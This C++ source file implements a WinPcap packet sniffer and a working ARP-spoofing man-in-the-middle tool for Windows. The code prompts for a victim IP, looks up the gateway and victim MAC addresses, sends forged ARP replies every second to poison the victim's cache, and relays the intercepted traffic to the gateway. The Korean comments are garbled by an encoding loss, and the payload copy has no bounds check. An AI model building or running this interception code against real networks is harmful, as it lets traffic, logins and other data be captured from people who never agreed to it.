#include "Winpcap_Packet_System.h"


void Winpcap_Packet_System::Print_Hex(void *Data, u_int len)
{

	u_int iLin;
	int iCnt;
	fprintf(stdout, "\n=================================================================================\n");
	fprintf(stdout, "[  Addr  ]  00 01 02 03 04 05 06 07   08 09 0A 0B 0C 0D 0E 0F | \n");
	fprintf(stdout, "---------------------------------------------------------------------------------\n");

	for (iLin = 0; iLin < len; iLin += 16)
	{
		fprintf(stdout, "[%08x] ", iLin);
		for (iCnt = 0; iCnt < 16; ++iCnt)
		{
			if (iCnt == 8)
			{
				fprintf(stdout, "  ");
			}

			if ((iCnt + iLin) < len)
			{
				fprintf(stdout, " %02X", *((u_char*)Data + iCnt + iLin));
			}
			else
			{
				fprintf(stdout, "   ");

			}
		}


		printf(" | ");

		for (int iCnt = 0; iCnt < 16; ++iCnt)
		{
			if (iCnt == 8)
			{
				fprintf(stdout, " ");
			}


			if ((iCnt + iLin) < len)
			{

				if (((*((u_char*)Data + iCnt + iLin)) >= 33) && ((*((u_char*)Data + iCnt + iLin)) <= 126))
				{
					fprintf(stdout, "%c", *((u_char*)Data + iCnt + iLin));
				}
				else
				{
					printf(".");
				}
			}
			else
			{
				printf(" ");
			}

		}

		printf("\n");
	}

	fprintf(stdout, "=================================================================================\n\n");


}


int Winpcap_Packet_System::open_device(pcap_t *_adhandle, int _flag)
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	char error_buf[PCAP_ERRBUF_SIZE];

	int num;
	int i = 0;
	// DEVICE lIST �˻�
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL /* auth is not needed */, &alldevs, error_buf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", error_buf);
		exit(1);
	}

	/* Print the list */
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf_s("%d", &num);

	if (num < 1 || num > i)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* Jump to the selected adapter */
	for (d = alldevs, i = 0; i < num - 1; d = d->next, i++);

	if ((adhandle = pcap_open(d->name,  // name of the device
		65536,     // portion of the packet to capture.
				   // 65536 grants that the whole packet will be captured on all the MACs.
		PCAP_OPENFLAG_PROMISCUOUS,         // promiscuous mode
		1,      // read timeout
		NULL,      // remote authentication
		error_buf     // error buffer
		)) == NULL)
	{
		//		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n");
		/* Free the device list */
		return -1;
	}

	 // �� �Ʒ��� ARP_SPOOfing �����̴�.

	if (_flag == 1)
	{
		// ����Ʈ ���� ������ ���´�.
		PIP_ADAPTER_ADDRESSES Adapter_addr;
		PIP_ADAPTER_GATEWAY_ADDRESS Gate_addr;

		Adapter_addr = Find_Addapter(d->name); // �����
		Gate_addr = Adapter_addr->FirstGatewayAddress; // ����Ʈ ����


		// �������� Mac �ּ� ȹ�� 
		if (Adapter_addr->PhysicalAddressLength != 0)
		{
			for (int i = 0; i < (int)Adapter_addr->PhysicalAddressLength; i++)
			{
				Basic_addr.attacker_mac.push_back(Adapter_addr->PhysicalAddress[i]); // �������� �� ����.
			}
		}

		//����Ʈ���� ������ ����
		while (Adapter_addr->FirstUnicastAddress != NULL)
		{
			sockaddr_in *sa_in = (sockaddr_in *)Adapter_addr->FirstUnicastAddress->Address.lpSockaddr;

			if (sa_in->sin_family == AF_INET)
			{
				for (int i = 0; i < 4; i++)
				{
					Basic_addr.attacker_ip.push_back(Adapter_addr->FirstUnicastAddress->Address.lpSockaddr->sa_data[i + 2]); // �������� IP ����
					Basic_addr.gate_ip.push_back(Gate_addr->Address.lpSockaddr->sa_data[i + 2]); // ����Ʈ IP ����
				}
				break;
			}

			Adapter_addr->FirstUnicastAddress = Adapter_addr->FirstUnicastAddress->Next;
		}


		// ����� IP ����
		Input_Victim_ip();


		// 1. ����� IP -> �Է�
		// 2. �������� MAC  �� 3. IP �� ����͸� �˸� ã�� �� �ִ�.
		// 4. ����Ʈ���� IP �� ����ͷ� ã�� �� �ִ�.
		// 5. ����Ʈ���� MAC �� 6. ����� MAC �� ARP ����� ����ؼ� �˾Ƴ���.

		Basic_addr.gate_mac = Send_ARP_For_Macaddr(adhandle, GET_GATEMAC_MODE);
		Basic_addr.victim_mac = Send_ARP_For_Macaddr(adhandle, GET_VICTIMEMAC_MODE);
		
		// ���ؿ� ����Ʈ ���� ������ ARP SPOOFING �� �ʿ��� �ڷḦ �����Ѵ�.
	}
	
	pcap_freealldevs(alldevs);



	return 1;
}

void Winpcap_Packet_System::pcap_handler(u_char * param, const pcap_pkthdr * header, const u_char * pkt_data)
{
	etc_header *eth;
	ip_header *ih;
	tcp_header *th;
	//udp_header *uh;
	char data_buffer[2048];
	u_int ip_len;
	u_int th_len;
	//u_int uh_len;
	//u_short sport, dport;
	int data_len;
	 unsigned char *data_ptr;

	eth = (etc_header*)(const u_char*)(pkt_data);

	ih = (ip_header *)(pkt_data +14); /* retireve the position of the ip header */
	ip_len = (ih->ver_ihl & 0xf) * 4; //length of ethernet header

	printf("\n=============================================\n\n");
	printf(" Source Mac Address : ");
	for (int i = 0; i < 6; i++)
	{
		printf("%02X ", eth->ether_shost[i]);
	}
	printf("\n");

	printf(" Destination Mac Address : ");
	for (int i = 0; i < 6; i++)
	{
		printf("%02X ", eth->ether_dhost[i]);
		
		
	}
	printf("\n\n");

	printf(" Source IP :");
	for (int i = 0; i < 4; i++)
	{
		printf("%d ", ih->saddr[i]);
	}

	printf("\n");

	printf(" Destination IP :");
	for (int i = 0; i < 4; i++)
	{
		printf("%d ", ih->daddr[i]);
	}
	printf("\n");
	
	printf(" IP Header length : %d", ip_len);
	// �ٸ��͵� �ִµ� ������ ���߿� ����.

	printf("\n\n");

	//TCP�� UDP �϶� ������ �߰����ָ�ȴ�. ICMP �� ������ ���߿� �����ϵ�������.
	if (ih->proto == TCP_PRO)
	{
		th = (tcp_header *)((u_char*)ih + ip_len); // tcp�� udp �� �Ѵ� ip ��� ������ ���۵Ǳ⶧���� �̷��� �ص� �����ϴ�.
		th_len = th->hlen << 2; // TCP ������� ũ���� , �ɼ� ���� �����
		printf("============TCP Information==================\n");
		printf("=============================================\n");
		printf(" Source Port : %d\n", ntohs(th->sourceport));
		printf(" Destination Port : %d\n", ntohs(th->destport));
		printf(" FLAG : %d\n", th->flag);
		printf(" TCP Length : %d\n", th_len);
		printf("=============================================\n");
		
		data_len = ntohs(ih->tlen) - ip_len - th_len;
		data_ptr = (unsigned char*)th + th_len;

		for (int i = 0; i < data_len; i++)
		{
			data_buffer[i] = (isprint(data_ptr[i])) ? data_ptr[i] : '.';
		}
		data_buffer[data_len] = '\0';
		printf("%s", data_buffer);
		
	
	}
	else if (ih->proto == UDP_PRO)
	{
		//uh = (udp_header *)((u_char*)ih + ip_len); // ip ������� ������ �ƴϱ� ������ �̷��� ������Ѵ�.
		//printf("============UDP Information==================\n");
		//printf("============================================\n");
		//printf(" Source Port : %d\n", sport);
		//printf(" Destination Port : %d\n", dport);
		//printf(" UDP Len : %d\n", uh->len);
		//printf(" UDP Checksum : %d\n", uh->crc);
		//printf("=============================================\n");

	}

}

int Winpcap_Packet_System::Input_Victim_ip()
{
	//infection *infec;
	string temp_mac;
	string temp_split = ".";
	string token;
	size_t pos = 0;

	int i = 0;
	int num;

	cout << "������ ����� IP Address : ";
	cin >> temp_mac;
	
	//Victim_ip ����ϱ�.
	while ((pos = temp_mac.find(temp_split)) != string::npos)
	{
		token = temp_mac.substr(0, pos);
		num = atoi(token.c_str());
		Basic_addr.victim_ip.push_back(num);
		temp_mac.erase(0, pos + 1);
	}

	num = atoi(temp_mac.c_str());
	Basic_addr.victim_ip.push_back(num);

	//Victim_Mac ����ϱ�

	return 0;
}

PIP_ADAPTER_ADDRESSES Winpcap_Packet_System::Find_Addapter(string _device_name)
{
	
	int pos = 0;
	pos = _device_name.find("{");
	_device_name.erase(0, pos);

	DWORD dwSize = 0;
	DWORD dwRetVal = 0;

	ULONG flags = GAA_FLAG_INCLUDE_GATEWAYS;
	ULONG family = AF_UNSPEC;

	LPVOID lpMsgBuf = NULL;

	PIP_ADAPTER_ADDRESSES pAddresses = NULL;
	PIP_ADAPTER_ADDRESSES pCurrAddresses = NULL;

	IP_ADAPTER_PREFIX *pPrefix = NULL;

	ULONG outBufLen = 0;
	ULONG Iterations = 0;
	unsigned int i = 0;

	outBufLen = WORKING_BUFFER_SIZE;

	do {

		pAddresses = (IP_ADAPTER_ADDRESSES *)MALLOC(outBufLen);
		if (pAddresses == NULL) {
			printf
				("Memory allocation failed for IP_ADAPTER_ADDRESSES struct\n");
			exit(1);
		}

		dwRetVal = GetAdaptersAddresses(family, flags, NULL, pAddresses, &outBufLen);

		if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
			FREE(pAddresses);
			pAddresses = NULL;
		}
		else {
			break;
		}

		Iterations++;

	} while ((dwRetVal == ERROR_BUFFER_OVERFLOW) && (Iterations < MAX_TRIES));


	if (dwRetVal == NO_ERROR) {
		// If successful, output some information from the data we received
		pCurrAddresses = pAddresses;
		while (pCurrAddresses) {
			string k = pCurrAddresses->AdapterName;

			if (k.compare(_device_name) == 0) // ����͵� �߿��� ���� ������ ����Ϳ� ������
			{
				return pCurrAddresses;
			}
			pCurrAddresses = pCurrAddresses->Next;
		}
	}

	else 
	{
		printf("Call to GetAdaptersAddresses failed with error: %d\n",
			dwRetVal);
		if (dwRetVal == ERROR_NO_DATA)
			printf("\tNo addresses were found for the requested parameters\n");
		else {

			if (FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
				FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
				NULL, dwRetVal, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
				// Default language
				(LPTSTR)& lpMsgBuf, 0, NULL)) {
				printf("\tError: %s", (char*)lpMsgBuf);
				LocalFree(lpMsgBuf);
				if (pAddresses)
					FREE(pAddresses);
				exit(1);
			}
		}
	}

	if (pAddresses) {
		FREE(pAddresses);
	}

	return 0;
}

vector<u_char> Winpcap_Packet_System::Send_ARP_For_Macaddr(pcap_t* _handle, int flag)
{
	static const int BUF_SIZE = sizeof(infection);
	u_char buf[BUF_SIZE];

	infection *infec = (infection *)buf;
	
	// temp ethernet ��� ����
	for (int i = 0; i < 6; i++)
	{
		infec->etc.ether_dhost[i] = 0xFF;
		infec->etc.ether_shost[i] = Basic_addr.attacker_mac[i];
		infec->arp.source_Macaddr[i] = Basic_addr.attacker_mac[i];
		infec->arp.Des_Macaddr[i] = 0xFF;
		
	}
	infec->etc.ether_type = htons(ETHERTYPE_ARP);

   // tep arp ��� ����
	infec->arp.hard_type = htons(0x1);
	infec->arp.Pro_type = htons(0x0800);
	infec->arp.hard_length = 6;
	infec->arp.pro_length = 4;
	infec->arp.op_code = htons(0x01);

	vector<u_char> get_mac;

	// mac ������ �������� ������ ������ �ϸ�ȴ�.

	for (int i = 0; i < 4; i++)
	{
		infec->arp.source_ipaddr[i] = Basic_addr.attacker_ip[i];

			if (flag == GET_GATEMAC_MODE) 
			{
				infec->arp.Des_ipaddr[i] = Basic_addr.gate_ip[i];
			}

			else if (flag == GET_VICTIMEMAC_MODE)
			{
				infec->arp.Des_ipaddr[i] = Basic_addr.victim_ip[i];
			}
	}

	bool check = false;

	int res = 0;
	struct pcap_pkthdr *header;
	const u_char *pkt_data;

	infection* Recieve_arp;

	while ((res = pcap_next_ex(_handle, &header, &pkt_data)) >= 0) 
	{
		if (pcap_sendpacket(_handle, (u_char*)infec, 42) != 0)
		{
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(_handle));
		}

		Recieve_arp = (infection *)(pkt_data); // �޾ƿ��� ��Ŷ

		for (int i = 0; i < 4; i++)
		{
			if (Recieve_arp->arp.source_ipaddr[i] == infec->arp.Des_ipaddr[i]) //�������� Ÿ�� ������ == �˰����ϴ� �ҽ� ������
				check = true;

			else
			{
				check = false;
				break;
			}
		}

		if (check)
		{
			for (int i = 0; i < 6; i++)
			{
				get_mac.push_back(Recieve_arp->arp.source_Macaddr[i]);
			}
			break;
		}
	}


	return get_mac;
}

void Winpcap_Packet_System::Send_Arp_Infection_Packet()
{
	infection *infection_packet = new infection;

	for (int i = 0; i < 6; i++)
	{
		infection_packet->etc.ether_dhost[i] = Basic_addr.victim_mac[i];
		infection_packet->etc.ether_shost[i] = Basic_addr.attacker_mac[i];
		infection_packet->arp.source_Macaddr[i] = Basic_addr.attacker_mac[i];
		infection_packet->arp.Des_Macaddr[i] = Basic_addr.victim_mac[i];
	}

	for (int i = 0; i < 4; i++)
	{
		infection_packet->arp.source_ipaddr[i] = Basic_addr.gate_ip[i];
		infection_packet->arp.Des_ipaddr[i] = Basic_addr.victim_ip[i];
	}
	
	infection_packet->etc.ether_type = htons(ETHERTYPE_ARP);

	infection_packet->arp.hard_type = htons(0x1);
	infection_packet->arp.Pro_type = htons(0x0800);
	infection_packet->arp.hard_length = 6;
	infection_packet->arp.pro_length = 4;
	infection_packet->arp.op_code = htons(0x02);  // reply
		
	u_char *temp = (u_char*)infection_packet;

	while (1)
	{
		if (pcap_sendpacket(adhandle, temp, 42) != 0)
		{
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(adhandle));
			return;
		}
		
		Sleep(1000);
	}

}

void Winpcap_Packet_System::Send_Arp_Relay_Packet()
{

	struct pcap_pkthdr *header;
	const u_char *pkt_data;
	bool _check = false;
	u_char for_change_packet[0xffff];

	while (true) 
	{

		pcap_next_ex(adhandle, &header, &pkt_data);
		_check = false;

		for (int m = 0; m < 6; m++)
		{
			if (pkt_data[m] == Basic_addr.attacker_mac[m]) // �����ڰ� �����ڿ��� ������ ��Ŷ�϶�
			{
				_check = true;
			}
			else
			{
				_check = false;
				break;
			}
		}

		if (_check == true)
		{

			for (int n = 0; n < 6; n++)
			{ //
			  // ����Ʈ���� �� arp-a ��ġ��˼� �ִ�.
				for_change_packet[n] = Basic_addr.gate_mac[n];// _temp2->etc.ether_dhost[n]; // �������� ��
				for_change_packet[n + 6] = Basic_addr.attacker_mac[n];// _temsp2->etc.ether_shost[n];
			}

			for (u_int n = 12; n < header->len; n++)
			{
				for_change_packet[n] = pkt_data[n];
			}

			if (pcap_sendpacket(adhandle, for_change_packet, header->len) != 0)
			{
				fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(adhandle));
				return;
			}
		}

	}

}




void Winpcap_Packet_System::_RunPacketCapture()
{
	if (open_device(adhandle,0) == -1)
	{
		return;
	}

	else
	{
		pcap_loop(adhandle, 0, pcap_handler, NULL);
	}
}

void Winpcap_Packet_System::_RunArpSpoofing()
{

	if (open_device(adhandle,1) == -1)
	{
		return;
	}

	else
	{

		// Victim ����ȹ��
		// ���� ip�� �˾Ƶ� ��� ������ �ҷ��� �� �ֵ��� �ڵ�ȭ�ؾ� �Ѵ�.
		// 1. GateWay IP �� GateWay Mac �� �˾ƾ� �ȴ�.
		// 2. ������ �ڽ��� Mac�� ������ �ڽ��� ip �� �˾ƾ� �Ѵ�.
		// 3. ���� IP �ּҸ� �˸� ���� MAC �ּҵ� �˼� �ִ�.

		// -> open_device ���� ó�������� �÷��� �� 1�� �����.

		// Arp Infection ��Ŷ�� ������ �Ѵ�.
		// 1. ���� ��Ŷ�� ARP HEADER�� ETERNET ����� ��ģ���̴�.
		// 2. ���� ������ arp -a ��ɾ ���� Ȯ���� �� �ִ�. (���ͳݵ� ����� )
		// 3. ���� ȹ������ ���� ������ ���� �� �ڽ�(������)�� ���� ����ڷκ��� infection ��Ŷ�� �����Ѵ�.


		// -> void Send_Arp_Infection_Packet();
		
		//std::thread InfectThread(&Winpcap_Packet_System::Send_Arp_Infection_Packet, Winpcap_Packet_System());
		//std::thread RelayThread(&Winpcap_Packet_System::Send_Arp_Relay_Packet, Winpcap_Packet_System());
		
		//Send_Arp_Infection_Packet();
		//InfectThread.join();
		//RelayThread.join]
		std::thread* InfectThread;
		std::thread* RelayThread;

		InfectThread = new std::thread(&Winpcap_Packet_System::Send_Arp_Infection_Packet, this);
		RelayThread = new std::thread(&Winpcap_Packet_System::Send_Arp_Relay_Packet, this);

		InfectThread->join();
		RelayThread->join();

		 // Or you could use std::unique_ptr<>.
								 /****/
	

		// Arp Relay ��Ŷ�� ������ �Ѵ�. ( source ������ destination ����� )
		// 1. ARP_INFECTION �� �����ϸ� �� �ڽŵ� ����ڿ� ���ؼ� �����Ǳ� ������
		//    ����Ʈ���̿��� ����� ���ؼ� ���� ���� �� �ڽŵ� �����Ǿ� ���ͳ� ������ �ȵȴ�.
		// 2. ���ͳ� ������ �ȵǰ� �Ǹ� ARP_Spoofing�� ���ؼ� ��� �̵��� �ƹ��͵� ���� ������
		//	  �� �ڽŰ� ����ϴ°� �ƴ� ������� ����ϴ�ô �ӿ��� �Ѵ�.

		// -> void Make_Arp_Relay_Packet();

	}

}
	
